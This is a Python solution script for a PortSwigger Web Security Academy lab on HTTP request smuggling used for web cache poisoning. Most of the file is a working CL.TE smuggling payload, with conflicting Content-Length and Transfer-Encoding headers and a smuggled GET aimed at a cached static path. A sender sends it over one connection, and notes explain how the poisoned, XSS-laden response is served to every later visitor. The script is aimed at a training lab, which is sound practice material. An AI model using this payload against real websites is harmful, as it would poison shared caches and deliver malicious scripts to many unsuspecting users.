"""
Lab 11: Exploiting HTTP request smuggling to perform web cache poisoning
https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning
Difficulty: Expert

📝 Smuggle a request whose RESPONSE (an XSS-laden redirect/page) gets
cached by the front-end cache under a popular, innocent-looking path
(e.g. /resources/js/tracking.js). Every subsequent visitor fetching that
cached path gets served our malicious response until the cache expires.
"""

from utils import send_same_connection, normalize_crlf, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
CACHED_PATH = "/resources/js/tracking.js"  # confirm the actual cacheable static path

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET {cached_path} HTTP/1.1
Host: {host}
X-Cache-Buster: {cache_buster}

""".format(host=HOST, cached_path=CACHED_PATH, cache_buster="1"))


def run():
    note("The smuggled GET targets a cacheable static-looking path. If the")
    note("front-end's cache keys only on path+a cache-buster param, and the")
    note("smuggled request's injected headers alter what gets returned")
    note("(e.g. an injected 'Content-Type: text/html' turning the JS response")
    note("into a rendered, XSS-triggering HTML page), that poisoned response")
    note("gets cached and served to everyone who requests the same path.")

    results = send_same_connection(HOST, [SMUGGLE_PAYLOAD])
    log(f"Smuggle sent, response: {results[0][0][:200]!r}")

    note("Verify by fetching CACHED_PATH fresh afterward and checking whether")
    note("the poisoned response (not the original JS) comes back — and that")
    note("the cache's own hit/miss header confirms it's being served from cache.")


if __name__ == "__main__":
    run()
